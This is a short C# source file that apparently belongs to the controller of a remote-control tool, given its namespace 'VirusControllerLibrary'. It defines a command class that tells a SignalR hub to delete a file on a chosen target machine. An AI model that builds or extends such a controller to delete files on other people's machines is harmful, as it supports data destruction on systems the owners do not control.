using Microsoft.AspNetCore.SignalR.Client;
using System.Threading.Tasks;

namespace VirusControllerLibrary
{
    public class DeleteFileCommand : AdminHubCommand, IHaveOneTargetCommand
    {
        public string TargetId { get; private set; }
        public string DirectoryName { get; private set; }
        public override string Name => "DeleteFile";

        public DeleteFileCommand(string targetId, string filePath)
        {
            TargetId = targetId;
            DirectoryName = filePath;
        }
        public override async Task ExecuteAsync() =>
            await _hubConnection?.InvokeAsync(Name, TargetId, DirectoryName);
    }
}
